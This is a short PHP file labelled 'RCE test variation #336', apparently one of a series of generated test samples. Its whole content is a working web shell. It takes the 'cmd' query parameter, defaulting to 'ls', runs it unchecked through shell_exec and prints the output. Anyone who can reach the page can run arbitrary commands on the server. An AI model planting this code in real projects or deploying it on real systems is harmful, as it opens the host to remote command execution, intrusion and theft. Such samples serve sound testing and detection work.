<?php
// RCE test variation #336
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>